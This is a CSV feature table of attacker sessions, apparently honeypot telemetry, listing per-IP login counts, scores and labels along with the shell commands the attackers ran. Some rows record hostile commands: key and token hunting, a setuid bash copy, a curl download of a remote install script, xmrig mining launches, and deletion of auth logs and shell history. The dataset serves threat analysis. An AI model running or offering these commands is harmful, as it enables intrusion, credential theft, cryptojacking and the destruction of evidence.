src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
1.117.185.183,32,1,5,27,3,3,1,1,24,32,32,1,385.0,74472.0,19873.0,0,32,1,1,0,"['hostname', 'last | head -20', 'cat /etc/hostname', 'id', 'w', ""cat /proc/cpuinfo | grep 'model name' | head -1"", ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'ip route show', 'netstat -antp', 'cat /etc/resolv.conf', 'ip r', 'ss -antp', 'top -bn1 | head -20', 'pstree -a', 'ps aux | grep -v grep', 'ps aux', 'cat /proc/1/cmdline', 'ls -la /home/ubuntu', 'ls -la /home/ubuntu/TaskBoard', 'ls -la /', 'ls /home', 'shred -u /var/log/auth.log', 'disconnect']","hostname(1), last | head -20(1), cat /etc/hostname(1), id(1), w(1)","hostname, last | head -20, cat /etc/hostname, id, w, cat /proc/cpuinfo | grep 'model name' | head -1, sysctl -a 2>/dev/null | grep -i 'net\|kernel', mount | grep -v 'tmpfs\|cgroup', ip route show, netstat -antp",24,0,0,0,0.1515151515151515,0.8181818181818182,0.5,12.0,3.7472074066619694,5.878787878787879,6.65624317475065,0.130062711601119,0.6476482359644986,suspicious_activity,medium
1.7.236.106,19,1,3,16,1,1,1,1,14,19,19,0,841.0,35058.0,50747.0,19,0,1,1,0,"['uname -a', 'uptime', 'ls -la /', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /', 'ls -la /var/tmp', ""find / -name '*.key' 2>/dev/null | head -10"", 'cat /home/ubuntu/TaskBoard/Backend/config/db.js', 'cat ~/.bashrc', 'cat ~/.profile', 'env | grep -i token', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', 'chmod 600 ~/.ssh/authorized_keys', 'exit']","uname -a(1), uptime(1), ls -la /(1), ls -la /home/ubuntu/TaskBoard/Backend/(1), ls /(1)","uname -a, uptime, ls -la /, ls -la /home/ubuntu/TaskBoard/Backend/, ls /, ls -la /var/tmp, find / -name '*.key' 2>/dev/null | head -10, cat /home/ubuntu/TaskBoard/Backend/config/db.js, cat ~/.bashrc, cat ~/.profile",14,2,0,0,0.15,0.8,0.75,7.0,0.6908252541972097,6.85,6.586892084751344,0.1363236747122372,0.5529653196173159,known_pattern,low
100.30.37.97,5,1,5,0,1,1,1,1,0,5,5,0,20.0,1647.0,435.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.777522935779817,5.0,5.0,0.403047490396018,0.42740616648279517,known_pattern,low
102.29.12.14,7,1,7,0,3,3,1,1,0,7,7,0,16.0,1368.0,132.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,10.285714285714286,4.375,7.0,0.4419756321337763,0.4133716340468879,known_pattern,low
103.43.124.152,5,1,5,0,1,1,1,1,0,5,5,0,3.0,615.0,1016.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.6047197640117994,4.166666666666667,5.0,0.307389372581324,0.45150069766944856,known_pattern,low
104.254.253.95,11,1,11,0,6,7,1,1,0,11,11,0,5.0,2934.0,1254.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.337848605577689,5.5,11.0,0.4421457805448864,0.4553658235702861,known_pattern,low
104.92.205.221,9,1,9,0,5,5,1,1,0,9,9,0,20.0,2978.0,289.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,10.26896551724138,5.4,9.0,0.5668419696757532,0.4407919800943821,known_pattern,low
107.16.32.246,8,1,8,0,2,4,1,1,0,8,8,0,3.0,894.0,1265.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.7777777777777778,0.0,0.7061611374407583,4.444444444444445,8.0,0.5263608149048974,0.4449630957750117,known_pattern,low
107.162.248.75,25,1,4,21,2,2,1,1,18,25,25,3,232.0,34680.0,47834.0,25,0,1,1,0,"['cat /etc/os-release', 'id', 'hostname', 'w', ""find / -name 'id_rsa' 2>/dev/null"", ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls /home/ubuntu/TaskBoard', 'ls -la /home/ubuntu/TaskBoard', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', '/tmp/payload.sh &', 'chmod +x /tmp/.xmrig', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'cat /proc/cpuinfo | grep processor | wc -l', 'cat /dev/null > ~/.bash_history', 'rm -f ~/.bash_history', 'quit']","cat /etc/os-release(1), id(1), hostname(1), w(1), find / -name 'id_rsa' 2>/dev/null(1)","cat /etc/os-release, id, hostname, w, find / -name 'id_rsa' 2>/dev/null, find / -name '*.conf' -readable 2>/dev/null | head -20, ls /home/ubuntu/TaskBoard, ls -la /home/ubuntu/TaskBoard, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",18,3,1,0,0.1538461538461538,0.8076923076923077,0.6,9.0,0.7249921605518972,7.1923076923076925,7.603020933650971,0.1392756474364681,0.524592290073546,known_pattern,low
107.52.72.242,8,1,8,0,4,4,1,1,0,8,8,0,4.0,2968.0,1153.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.5719237435008666,5.333333333333333,8.0,0.4252061423502597,0.41167498221387866,known_pattern,low
107.95.124.5,10,1,10,0,4,6,1,1,0,10,10,0,30.0,1565.0,243.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.6363636363636364,0.0,6.413934426229508,5.454545454545454,10.0,0.5511307041314621,0.446760519489115,known_pattern,low
